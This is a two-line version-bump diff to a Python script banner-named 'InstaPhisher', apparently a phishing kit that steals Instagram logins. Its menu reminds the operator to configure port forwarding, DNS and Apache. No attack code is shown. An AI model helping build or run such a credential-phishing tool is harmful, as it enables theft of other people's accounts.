@@ -1,6 +1,6 @@
 # ----------------------#
 # __Author__  Exilas    #
-# __Version__ 2.2       #
+# __Version__ 2.3       #
 # ----------------------#
 
 import time
@@ -17,7 +17,7 @@ def menu():
 	print('[i] Make sure you have make port forwarding')
 	print('[i] Make sure you have configured your DNS')
 	print('[i] Make sure you have started apache')
-	print('\nExilas // InstaPhisher // Version 2.2')
+	print('\nExilas // InstaPhisher // Version 2.3')
 	print('----------------------------------------------------------')
 
 
